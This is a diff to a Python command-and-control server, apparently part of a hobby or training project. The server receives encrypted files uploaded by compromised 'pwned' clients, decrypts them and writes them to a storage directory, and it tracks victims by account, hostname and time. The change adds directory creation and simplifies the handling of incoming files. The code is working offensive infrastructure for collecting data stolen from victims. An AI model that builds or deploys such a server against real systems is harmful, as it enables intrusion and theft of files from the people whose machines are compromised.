@@ -2,6 +2,7 @@
 
 from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from os import mkdir, path
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
@@ -191,13 +192,9 @@ class C2Handler(BaseHTTPRequestHandler):
             # We need the content length to properly read in the file
             file_length = int(self.headers["Content-Length"])
 
-            # Zero byte files cant't be transferred in
-            if file_length is None:
-                print(f"{incoming_file} has no data. Abording transfer.")
-            else:
-                # Read the stream coming from our client. decrypt and write the file out to disk
-                with open(incoming_file, "wb") as file_handle:
-                    file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+            # Read the file stream, decrypt it, and then write to disk
+            with open(incoming_file, "wb") as file_handle:
+                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
 
         # Nobody should ever be accessing to our c2 server using HTTP PUT
         else:
@@ -260,6 +257,10 @@ pwned_id = 0
 
 # Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
 pwned_dict = {}
+
+# If the storage directory is not present on our c2 server, create it
+if not path.isdir(STORAGE):
+    mkdir(STORAGE)
 
 # Instantiate oour HTTPServer object
 server = HTTPServer((BIND_ADDR, PORT), C2Handler)
